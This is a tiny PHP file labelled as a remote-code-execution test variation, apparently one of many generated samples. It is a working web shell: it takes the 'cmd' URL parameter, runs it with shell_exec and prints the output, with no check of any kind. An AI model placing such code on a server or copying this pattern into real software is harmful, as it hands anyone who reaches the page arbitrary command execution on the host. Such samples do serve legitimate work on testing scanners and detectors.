<?php
// RCE test variation #893
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>